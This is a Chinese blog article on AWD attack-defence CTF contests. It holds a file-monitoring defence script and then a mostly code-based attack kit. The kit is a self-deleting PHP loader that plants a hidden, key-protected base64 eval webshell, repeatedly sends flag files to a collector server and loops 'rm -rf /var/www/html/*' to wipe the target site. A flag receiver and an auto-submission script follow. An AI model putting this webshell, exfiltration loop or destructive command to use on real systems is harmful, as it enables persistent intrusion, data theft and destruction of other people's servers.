> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/fYRTrx3lTW2F-xrKdpkCjw)

**先说几点经验：**  

1、分配的是 ctf 低权限账号，但是中间件运行的是 www-data 权限，通常比 ctf 权限高，有些马用 ssh 上去删不掉，可以先传个自己的 shell 然后去删，当然得做一个防止被偷家的措施，比如说加一个 if ("xxx"===md5(key)) 的操作。也可以用 www-data 去对文件和目录做权限的修改等操作。

2、黑吃黑，直接用别的队伍上传的 shell。

3、不是特别大型的比赛没有那么多的时间去审漏洞，通常用 nday 直接打，或者内置的 shell 后门。

4、批量拿 flag 并自动提交平台；自动备份与恢复自己的靶机文件。  

主要放两个脚本，一个攻一个防，网上找了很多都感觉多多少少有点问题。  

**AWD 线下赛防守脚本：**

1. 该脚本基于 python，可直接在 linux 靶机上运行。

2. 开局直接运行起来，会自动对 web 目录进行备份，并建立 hash 索引。当 web 目录下有文件被删除或者被篡改的时候，会自动从备份中恢复文件。如果存在其他文件上传，会自动删除。

3. 无法避免的缺点：由于条件竞争，如果对方在我们删除 shell 之前就已经在内存中开始生成不死马了，还是有一定几率沦陷。

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ceXelicaeCYoVN1LwSl6KPW7WFyUq9K6sTuvfXhwOjNkHMyhYBnnqr9ialqgYcrQ4NdhibaXEGF2YA/640?wx_fmt=png)

```python
# -*- coding: utf-8 -*-#
# awd文件监控脚本
# author：说书人
import os
import json
import time
import hashlib


def ListDir(path):  # 获取网站所有文件

    for file in os.listdir(path):
        file_path = os.path.join(path, file)
        if os.path.isdir(file_path):
            if initialization['ok'] == 'false':
                dir_list.append(file_path)
            else:
                dir_list_tmp.append(file_path)
            ListDir(file_path)
        else:
            if initialization['ok'] == 'false':
                file_list.append(file_path)
            else:
                file_list_tmp.append(file_path)


def GetHash():  # 获取hash，建立索引
    for bak in file_list:
        with open(bak, 'rb') as f:
            md5obj = hashlib.md5()
            md5obj.update(f.read())
        hash = md5obj.hexdigest()
        bak_dict[bak] = hash
    if os.path.exists('/tmp/awd_web_hash.txt') == False:
        os.system('mkdir /tmp/awd_web_bak/')
        os.system('\\cp -a {0}* /tmp/awd_web_bak/'.format(web_dir))
        with open('/tmp/awd_web_hash.txt', 'w') as f:  # 记录web文件hash
            f.write(str(json.dumps(bak_dict)))
        for i in file_list:  # 记录web文件列表
            with open('/tmp/awd_web_list.txt', 'a') as f:
                f.write(i + '\n')
        for i in dir_list:  # 记录web目录列表
            with open('/tmp/awd_web_dir.txt', 'a') as f:
                f.write(i + '\n')


def FileMonitor():  # 文件监控
    # 提取当前web目录状态
    initialization['ok'] = 'true'
    for file in os.listdir(web_dir):
        file_path = os.path.join(web_dir, file)
        if os.path.isdir(file_path):
            dir_list_tmp.append(file_path)
            ListDir(file_path)
        else:
            file_list_tmp.append(file_path)
    for file in file_list_tmp:
        with open(file, 'rb') as f:
            md5obj = hashlib.md5()
            md5obj.update(f.read())
        hash = md5obj.hexdigest()
        bak_dict_tmp[file] = hash
    with open('/tmp/awd_web_hash.txt', 'r') as f:  # 读取备份的文件hash
        real_bak_dict = json.loads(f.read())
    with open('/tmp/awd_web_list.txt', 'r') as f:  # 读取备份的文件列表
        real_file_list = f.read().split('\n')[0:-1]
    with open('/tmp/awd_web_dir.txt', 'r') as f:  # 读取备份的目录列表
        real_dir_list = f.read().split('\n')[0:-1]

    for dir in real_dir_list:  # 恢复web目录
        try:
            os.makedirs(dir)
            print("[del-recover]dir:{}".format(dir))
        except:
            pass

    for file in file_list_tmp:
        try:
            if real_bak_dict[file] != bak_dict_tmp[file]:  # 检测被篡改的文件，自动恢复
                os.system('\\cp {0} {1}'.format(file.replace(web_dir, '/tmp/awd_web_bak/'), file))
                print("[modify-recover]file:{}".format(file))
        except:  # 检测新增的文件，自动删除
            os.system('rm -rf {0}'.format(file))
            print("[delete]webshell:{0}".format(file))

    for real_file in real_file_list:  # 检测被删除的文件，自动恢复
        if real_file not in file_list_tmp:
            os.system('\\cp {0} {1}'.format(real_file.replace(web_dir, '/tmp/awd_web_bak/'), real_file))
            print("[del-recover]file:{0}".format(real_file))
    file_list_tmp[:] = []
    dir_list_tmp[:] = []


os.system("rm -rf /tmp/awd_web_hash.txt /tmp/awd_web_list.txt /tmp/awd_web_dir.txt /tmp/awd_web_bak/")
web_dir = "/var/www/"  # web目录，注意最后要加斜杠
file_list = []
dir_list = []
bak_dict = {}
file_list_tmp = []
dir_list_tmp = []
bak_dict_tmp = {}
initialization = {'ok': 'false'}
ListDir(web_dir)
GetHash()
while True:
    print(time.ctime()+"   安全")
    FileMonitor()
    time.sleep(1)  # 监控间隔，按需修改
```

**AWD 线下赛攻击脚本：**

（1）内存马 & 自动获取刷新的 flag

该脚本功能：

1. 该脚本为内存脚本，访问一下就自删除，不留痕迹。

2. 自动读取 flag，并将 flag 提交到指定地址，会自动检测是否更新 flag，只有更新了 flag 才会提交，需要在脚本中修改 flag 物理路径。

3. 会生成不死马，不死马具有隐藏和欺骗功能。用蚁剑访问 http://xxx/.c403d59fea33113df44d465aeec336ab.php?key=ssr2021shuoshurenmd5，密码为 a。

木马原始代码如下（只要别人不知道 key，就没办法黑吃黑）：

```
<?php $key=$_GET["key"];
$keyhash=md5($key);
if($keyhash==="c403d59fea33113df44d465aeec336ab") {
    eval($_POST["a"]);
}
echo"file not find.";
?>
```

这个只作为备用连接，flag 正常自己提交过来的话就不用管。

4. 该脚本会不断删除目标的网站源码，别人扣分等于我们加分。

5. 脚本命名必须为 awd2021.php，若要修改的话需要同步修改下面代码中的文件名。

```
<?php
function send_post($url, $post_data) {
    $postdata = http_build_query($post_data);
    $options = array(
            'http' => array(
              'method' => 'POST',
              'header' => 'Content-type:application/x-www-form-urlencoded',
              'content' => $postdata,
              'timeout' => 15 * 60 
            )
          );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    return $result;
}
$flag_tmp="flag{xxx}";
@unlink ("awd2021.php");
while (True) {
    $flag=system("cat flag.txt");
    $data=array(
          'flag' => $flag
        );
    if ($flag!=$flag_tmp) {
        send_post('http://127.0.0.1/getflag.php', $data);
    }
    $flag_tmp=$flag;
    $shell=base64_decode("PD9waHAgJGtleT0kX0dFVFsia2V5Il07CiRrZXloYXNoPW1kNSgka2V5KTsKaWYoJGtleWhhc2g9PT0iYzQwM2Q1OWZlYTMzMTEzZGY0NGQ0NjVhZWVjMzM2YWIiKSB7CglldmFsKCRfUE9TVFsiYSJdKTsKfQplY2hvImZpbGUgbm90IGZpbmQuIjsKPz4=");
    if (file_exists(".c403d59fea33113df44d465aeec336ab.php")==0) {
        file_put_contents(".c403d59fea33113df44d465aeec336ab.php", $shell, FILE_APPEND);
    }
    system("rm -rf /var/www/html/* !(.c403d59fea33113df44d465aeec336ab.php)");
}
?>
```

（2）服务端接收 flag

1. 按照往年比赛经验，靶机和我们的电脑是互通的，这个脚本可以本机开一个 phpstudy 跑起来，若不通的话直接放自己的靶机服务器上。

2. 这个脚本默认名字为 getflag.php，如果修改的话需要修改内存脚本中对应的文件名。

3. 新的 flag 会源源不断提交过来，在当前目录的 shuoshuren_flag.txt 里面。

```
<?php
$flag=$_POST["flag"];
file_put_contents("shuoshuren_flag.txt", $flag."\n", FILE_APPEND);
?>
```

（3）自动提交 flag 脚本

根据往年经验，flag 提交平台是有验证码的，所以这个脚本调用了验证码训练识别模型，达到自动化提交 flag 的目的，平台没有验证码的话就不用识别。

```
# AWD自动提交flag脚本
# base python3
# author：说书人
import requests
import base64
import json
import time


def GetPic(url):  # 获取验证码并识别，这里会调用我本机的验证码训练识别模型（refer：算命瞎子）
    pic_content=requests.get(url).content
    pic_base64=base64.b64encode(pic_content).decode()
    data='base64='+pic_base64
    try:
        yzm=requests.post('http://192.168.3.103:8899/base64',data=data).text
        return yzm
    except:
        return 'yzm'


def PostFlag(PostUrl,PicUrl,flag):  # 提交flag
    with open(flag,'r') as f:
        flag_list=f.read().split('\n')
    headers={
        #请求头需要现场抓包
    }
    for flag in flag_list:
        if flag in flag_list:
            print("{}   重复".format(flag))
        else:
            GetYzm=GetPic(PicUrl)
            data = json.dumps({"请求体需要现场抓包，字典格式"})
            try:
                res=requests.post(url=PostUrl,headers=headers,data=data)
                if '成功的标识符' in res.text:
                    print("{}   提交成功".format(flag))
                    flag_list_ok.append(flag)
                else:
                    print("{}   提交失败".format(flag))
            except:
                print('其他错误')


flag_list_ok=[]
while True:
    PostFlag("提交flag的请求地址","flag平台验证码的地址","shuoshuren_flag.txt")
    time.sleep(300)#休息5分钟，可以按需修改
```

之前的知识星球停止运营了，原因较多不再累述，新的星球打算重新割运营起来，之前的**付费**用户，不论支付了多少或者在不在有效期，均可以凭付款凭证免费加入新的星球，具体操作见原星球置顶说明。

主题可预览、三天可退款，感谢各位支持。

![](https://mmbiz.qpic.cn/mmbiz_png/TegOSv0yja6ceXelicaeCYoVN1LwSl6KPBoUxjGiaUEoyqv56fLPLKyZVjPuIUHLNmNOmTPN4SwFqhucunWdfmKQ/640?wx_fmt=png)